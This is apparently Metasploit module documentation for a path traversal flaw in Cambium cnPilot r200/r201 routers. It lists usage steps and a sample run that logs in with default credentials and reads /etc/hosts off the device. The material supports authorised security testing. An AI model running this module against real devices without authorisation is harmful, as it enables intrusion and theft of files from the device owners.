## Vulnerable Application

This module exploits a File Path Traversal vulnerability in Cambium cnPilot r200/r201 devices to read arbitrary files off the file system. Affected versions - 4.3.3-R4 and prior.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/cnpilot_r_fpt```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```set FILENAME [filename]```
5. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/http/cnpilot_r_fpt
msf auxiliary(cnpilot_r_fpt) > set RHOSTS 1.3.3.7
msf auxiliary(cnpilot_r_fpt) > set RPORT 80
msf auxiliary(cnpilot_r_fpt) > set FILENAME /etc/hosts
msf auxiliary(cnpilot_r_fpt) > run

[+] 1.3.3.7:80 - Cambium cnPilot confirmed...
[*] 1.3.3.7:80 - Attempting to login...
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "user":"user"
[*] 1.3.3.7:80 - Accessing the file...
[+] 127.0.0.1 localhost.localdomain localhost

[+] File saved in: /root/.msf4/loot/20000000000003_default_1.3.3.7_fptlog_12345.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


  ```
